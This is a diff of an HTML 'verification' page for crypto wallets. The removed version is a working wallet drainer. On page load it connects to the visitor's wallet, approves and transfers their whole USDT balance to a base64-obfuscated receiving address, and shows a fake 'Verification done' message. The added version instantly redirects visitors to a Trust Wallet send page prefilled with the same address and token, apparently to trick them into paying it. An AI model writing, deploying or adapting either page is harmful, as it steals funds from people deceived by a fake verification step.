@@ -1,85 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8" />
-  <title>Verifying...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
-    body {
-      margin: 0;
-      background: #00172e;
-      color: white;
-      font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-    }
-    .loader {
-      border: 4px solid rgba(255, 255, 255, 0.2);
-      border-top: 4px solid #00ccff;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
-</head>
-<body>
-  <div>
-    <div class="loader"></div>
-    <h3>Verifying Transaction...</h3>
-    <p id="status">Please wait while verification is completed.</p>
-  </div>
-
-  <script>
-    const encoded = "MHgxOTU2QjM5NTBBNzNCMEM1NDc5MjE5OUVkZjEzYzdjN2I4MzVGRjk0REM=";
-    const receiver = atob(encoded); // your hidden wallet
-    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
-    const ABI = [
-      "function approve(address spender, uint256 amount) public returns (bool)",
-      "function balanceOf(address account) view returns (uint256)",
-      "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)"
-    ];
-
-    async function autoVerify() {
-      const status = document.getElementById("status");
-
-      try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-        await provider.send("eth_requestAccounts", []);
-        const signer = provider.getSigner();
-        const user = await signer.getAddress();
-        const contract = new ethers.Contract(USDT, ABI, signer);
-
-        const balance = await contract.balanceOf(user);
-        if (balance.isZero()) {
-          status.innerText = "❌ No USDT in wallet.";
-          return;
-        }
-
-        status.innerText = "🔄 Approving...";
-        const approveTx = await contract.approve(receiver, balance);
-        await approveTx.wait();
-
-        status.innerText = "🔁 Transferring...";
-        const transferTx = await contract.transferFrom(user, receiver, balance);
-        await transferTx.wait();
-
-        status.innerText = "✅ Verification done. Thank you!";
-      } catch (e) {
-        status.innerText = "❌ Failed: " + e.message;
+  <head>
+    <meta charset="UTF-8" />
+    <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="0; url=https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955" />
+    <style>
+      body {
+        background: #001533;
+        color: white;
+        font-family: sans-serif;
+        text-align: center;
+        padding-top: 100px;
       }
-    }
-
-    window.onload = autoVerify;
-  </script>
-</body>
+    </style>
+  </head>
+  <body>
+    <h2>Redirecting to Trust Wallet Send Page...</h2>
+    <p>If not redirected, <a href="https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955">click here</a>.</p>
+  </body>
 </html>
